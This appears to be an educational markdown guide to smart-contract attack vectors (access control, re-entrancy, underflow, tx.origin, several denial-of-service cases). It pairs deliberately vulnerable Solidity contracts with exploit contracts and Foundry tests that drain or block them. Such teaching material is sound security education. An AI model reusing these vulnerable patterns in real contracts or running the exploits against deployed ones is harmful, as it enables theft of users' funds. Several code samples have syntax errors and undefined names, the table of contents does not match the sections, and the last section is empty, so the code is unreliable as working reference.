## 20 ATTACK VECTORS

- [Typographical Error](#typography)
- [Re-Entrancy Attack](#reentrancy)
- [Center](#center)
- [Color](#color)

## <font color="yellow"> Missing Access control  <a id="typography"></a></font>

### Description
*Access controls define the restrictions around privileges and roles of users in an application. Access control in smart contracts can be related to governance and critical logic like minting tokens, voting on proposals, withdrawing funds, pausing and upgrading the contracts, changing ownership, etc.*

### Code sample
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract MiddyBank {

    address adminAddress;

    uint loanid;

    event emitLoanId(uint LoanId, uint LoanRequestAmount);

    struct LoanInfo{
        address user;
        bool ispending;
        uint loanId;

    }

    struct Register {
        string username;
        bool active;
        address userAddress;
    }

    constructor(address) {
        adminAddress = payable(msg.sender);
    }

    function checkUserBalance(address _userAddress) public view returns(uint256){
        return _userAddress.balance;
    }

    function approveLoan(uint _loanID, bool loanPending, address _userAddress, uint amount) payable external {

        require(!loanPending, "Your loan has suceeded");
        (bool sent, ) = _userAddress.call{value: amount}("");
        require(sent, "Failed to send Ether");

    }

    function requestLoan (uint256 LoanRequestAmount) external{
        address LoanRequestaddress = msg.sender;
        uint256 balance = checkUserBalance(LoanRequestaddress);

        if(!UserInfo[LoanRequestaddress].active){
            revert Middey__NotAnActiveUser();
        }
        
        if(balance <= 1.0 ether){
            revert Middey__InsufficientFunds({
            _userAddress : LoanRequestaddress, 
            balance : balance
        });
        
        } 
        loanid++ ; // Get current LoanID and increment the counter
        LoanID[loanid] = LoanRequestaddress;
        emit emitLoanId(loanid, LoanRequestAmount);

    }
}
```
## Exploit Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {MiddyBank} from "../AccessControl.sol";

contract exploitAccessControl{
    MiddyBank public middyBank;
    constructor(address _target){
        middyBank = MiddyBank(_target);
    }

    // calls the function with missing access control

    function Callcontrol() external {
        middyBank.approveLoan(2, false, address(this), 2 ether);

    }
    
}

```
### Remediation
Majority of the smart contracts use OpenZeppelin’s Ownership library. Openzeppline’s Ownable defines modifiers like “onlyOwner” that check if the user making a function call is the owner of the contract. Other libraries also check if the user has privileges to call the function using modifiers/functions like “hasRole”.

## <font color="yellow">Re-Entrancy Attack <a id="Reentrancy"></a></font> 

### Description
*one major danger of calling external contracts is that they can take over the control flow as described thus: Let's say that contract A calls contract B.*

*Reentracy (a.k.a. recursive call attack) exploit allows B to call back into A before A finishes execution.*

### Code sample

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IEthBank {
    function deposit() external payable;
    function withdraw() external payable;
}

contract EthBankExploit {
    IEthBank public bank;

    constructor(address _bank) {
        bank = IEthBank(_bank);
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function pwn() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
}

```
## Exploit Contract
```
contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```

## Test Contract

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {EthBank} from "../src/ReentrancyEthBank.sol";
import {EthBankExploit} from "../src/ReentrancyExploit.sol";

contract EthBankExploitTest is Test {
    address private constant alice = address(1);
    address private constant bob = address(2);
    address private constant attacker = address(3);
    EthBank private bank;
    EthBankExploit private exploit;

    function setUp() public {
        bank = new EthBank();

        deal(alice, 1e18);
        vm.prank(alice);
        bank.deposit{value: 1e18}();

        deal(bob, 1e18);
        vm.prank(bob);
        bank.deposit{value: 1e18}();

        deal(attacker, 1e18);
        exploit = new EthBankExploit(address(bank));

        vm.label(address(bank), "EthBank");
        vm.label(address(exploit), "EthBankExploit");
    }

    function test_pwn() public {
        vm.prank(attacker);
        exploit.pwn{value: 1e18}();
        assertEq(address(bank).balance, 0);
    }
}


```
## <font color="yellow"> Arithmetic Overflow & Underflow <a id="typography"></a></font>

### Description
* When you store numbers in a computer, they are represented using a finite number of bits. For instance, in the Solidity programming language used for Ethereum smart contracts, a uint8 type represents an unsigned 8-bit integer. This means it can store values from 0 to 255 (since 2^8 - 1 = 255).

Overflow happens when an arithmetic operation produces a value that exceeds the maximum limit of the type. Conversely, underflow occurs when the operation results in a value that is below the minimum limit of the type.

Similarly, underflow occurs when subtracting 1 from 0 in a uint8 type. Since uint8 cannot represent negative numbers, the result wraps around to the highest value it can store, which is 255.


## Code Example

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract VulnerableContract {
    mapping(address => uint256) public balances;

    // Allow users to deposit ether and increase their balance
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Allow users to withdraw ether from their balance
    function withdraw(uint256 amount) public {
        // Vulnerability: No check for underflow
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }
    
    // Get the balance of the caller
    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}


```

## Exploit Code 

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./VulnerableContract.sol";

contract AttackContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    // Attack function to exploit the vulnerability
    function exploit() public {
        // Deposit a small amount of ether (1 wei)
        vulnerableContract.deposit{value: 1}();
        
        // Attempt to withdraw a large amount of ether, exploiting the underflow
        // We'll try to withdraw more than the deposited amount
        vulnerableContract.withdraw(2);
    }

    // Fallback function to receive ether
    receive() external payable {}
}

```
## <font color="yellow"> Authorization through tx.origin <a id="typography"></a></font>

### Description
* In Solidity, tx.origin is a global variable that returns the address of the externally owned account (EOA) that originally initiated the transaction. Understanding its behavior and implications is crucial, especially when it comes to authorization checks in smart contracts.

* How tx.origin Works
msg.sender: In the context of a contract function call, msg.sender represents the address that directly invoked the function (it could be an EOA or another contract).
tx.origin: This represents the original external account (EOA) that started the transaction, regardless of how many contracts are called in the process.
* Example Scenario
Consider a multi-contract call scenario: 

* External Account: An EOA (0xABC) initiates a transaction.
Contract A: 0xABC calls Contract A.
Contract A: In turn, calls Contract B.
In this setup:

Inside Contract A, ```msg.sender``` is ```0xABC``` and ```tx.origin``` is 0xABC.
Inside Contract B, ```msg.sender``` is Contract A and ```tx.origin``` is still 0xABC*

## Code Example

```
pragma solidity 0.4.24;

contract VictimContract {

    address payble owner;
    constructor () payable{
        owner = payable(msg.sender);
    }

    function transferFunds(address _to, uint256 _amount) public {
       require(tx.origin == owner, "YOU ARE NOT THE OWNER");

    (bool success, ) = _to.call{value: _amount}("")
    require(success, "Failed to send Ether");
    }

}

```


## Exploit Code 
```
pragma solidity 0.4.24;
contract AttackVictim {

    address public owner;

    VictimContract public victimAttack;

    constructor(address _target){
        victimAttack = VictimContract(_target)
        owner = payble(msg.sender);

    }
    function attack() external payble{
        victimAttack.transferFunds(owner, address(victimAttack).balance);
    }

    receive() external payable{
        attack();
    }
}

```

## <font color="yellow"> Improper Check or Handling of Exceptional Conditions <a id="typography"></a></font>

### Description

When dealing with smart contracts on the Ethereum blockchain, external calls are interactions with other contracts or addresses. These calls are critical for a variety of operations, including token transfers, contract interactions, and more. However, these external calls can fail for several reasons, both intentional and accidental.

When an external call fails, it can lead to a Denial of Service (DoS) condition. This means that certain parts of the contract may become unusable or blocked, preventing the contract from functioning as intended. Such failures can occur due to various reasons, such as:

The called contract running out of gas.
The called contract intentionally reverting the transaction.
Temporary network issues.
To minimize the potential impact of these failures, it is best to design contracts in a way that isolates each external call into its own separate transaction. This approach is especially important for handling payments or any operation involving the transfer of funds. Instead of automatically sending funds to users in a single transaction, it is better to let users withdraw funds by initiating their own transactions. This method not only mitigates the risk of DoS but also helps in managing gas costs more efficiently.

## Code Example

```
pragma solidity 0.4.24;

pragma solidity 0.4.24;

contract Refunder {

address[] private refundAddresses;
mapping (address => uint) public refunds;

    constructor() {
        refundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b184);
        refundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b185);
    }

    // bad
    function refundAll() public {
        // arbitrary length iteration based on how many addresses participated
        for(uint x; x < refundAddresses.length; x++) { 
            // doubly bad, now a single failure on send will hold up all funds
            require(refundAddresses[x].send(refunds[refundAddresses[x]])); 
        }
    }

}

```


## <font color="yellow"> DoS due to Block Limit <a id="typography"></a></font>


### Description

When smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based of how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block can not exceed the threshold.

Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition.

## Code Sample

```
pragma solidity ^0.4.25;

contract DosGas {

    address[] creditorAddresses;
    bool win = false;

    function emptyCreditors() public {
        if(creditorAddresses.length>1500) {
            creditorAddresses = new address[](0);
            win = true;
        }
    }

    function addCreditors() public returns (bool) {
        for(uint i=0;i<350;i++) {
          creditorAddresses.push(msg.sender);
        }
        return true;
    }

    function iWin() public view returns (bool) {
        return win;
    }

    function numberCreditors() public view returns (uint) {
        return creditorAddresses.length;
    }
}

```
The ```addCreditors``` function will certainly lead to a denial of service which will be due to block limit. This is due to the fact that it consistently adds a user as long as ```i < 350``` which is gas intensive. The loop keeps running till it essentially runs out of gas.



## <font color="yellow"> DoS Due to strict Equality  <a id="typography"></a></font>


### Description

Contracts that strictly rely on having a specific Ether balance can encounter issues. Ether can be sent to a contract forcibly, bypassing its fallback function, through methods like ```selfdestruct``` or by mining rewards. This could result in unexpected Ether in the contract's balance. In the worst-case scenario, such unexpected Ether could cause Denial of Service (DoS) conditions, potentially rendering the contract unusable.

In the vulnerable contract and attack contract below we would find out the vulnerability of strict equality checks which eventually leads to loss of funds in the PuppyNft contract when an attacker forcefully sends ether that disrup

## Vulnerable Contract
```
//SPDX-License-Identifier: MIT 

pragma solidity 0.8.20;

contract PuppyRaffle {

    address public owner;

    address public feeAddress;

    uint64 public totalFees = 0;

    constructor(){
        owner = msg.sender;
    }

    function withdrawFees() external {
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = owner.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
}

```
## Attck Contract

```
 // SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import {PuppyRaffle} from "./Puppy.sol";

contract  AttackPuppy {
    PuppyRaffle public puppyRaffle;

    constructor(address _target){
        puppyRaffle = PuppyRaffle( _target);
    }

     function destroy(address _puppyContract) external {
        selfdestruct(payable(_puppyContract));
    }
    receive() external payable {
      
    }

}
```
## Test Scenario

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/Puppy.sol";
import {AttackPuppy} from "../src/PuppyExploit.sol";

contract ClaimTest is Test {
    PuppyRaffle public puppyRaffle;
    AttackPuppy public attackPuppy;
    function setUp() public {
        puppyRaffle = new PuppyRaffle("NFT", "NonFungibility", price);
        attackPuppy = new AttackPuppy(address(safenft));
        deal(address(attackPuppy), 1 ether);
        attackPuppy.destroy(address(puppyRaffle));
       
        
    }

    function test_attack() public {
        vm.expectrevert("Can't withdraw fees");
        puppyRaffle.withdrawFees();
        ;
        
    }

    
}

```
## <font color="yellow"> Code With No Effects  <a id="typography"></a></font>


### Description
In Solidity, you can write code that fails to achieve its intended outcome without triggering any compiler warnings. This can result in "dead" code that doesn't execute the desired actions. For instance, if you accidentally omit the trailing parentheses in `msg.sender.call.value(address(this).balance)("");`, the function might proceed without transferring funds to `msg.sender`. It's crucial to avoid such issues by always checking the return value of the `call` to ensure the intended operation is successful.

## Vulnerable contract

```pragma solidity ^0.5.0;

contract DepositBox {
    mapping(address => uint) balance;

    // Accept deposit
    function deposit(uint amount) public payable {
        require(msg.value == amount, 'incorrect amount');
        // Should update user balance
        balance[msg.sender] == amount;
    }
}
 ```  

## <font color="yellow"> Unsafe Ownership Transfer in Smart Contracts <a id="typography"></a></font>

## Description:

Transferring ownership in smart contracts, such as when handing over governance rights or changing the administrator of a proxy, can be risky. If you mistakenly transfer ownership to the wrong account, you could lose control over your contract permanently. This situation is often referred to as an unsafe ownership transfer.

In blockchain-based smart contracts, ownership typically grants significant control over the contract's operations. For example, the owner might have the authority to:

Modify critical contract parameters.
Withdraw funds from the contract.
Execute special functions that are restricted to the owner.
Given the high stakes involved, transferring ownership must be handled with great care. If you accidentally assign ownership to an incorrect address, you may not be able to reclaim it, rendering the contract unmanageable. This mistake can lead to severe consequences, including loss of funds or the inability to perform necessary contract functions.

## Code Example






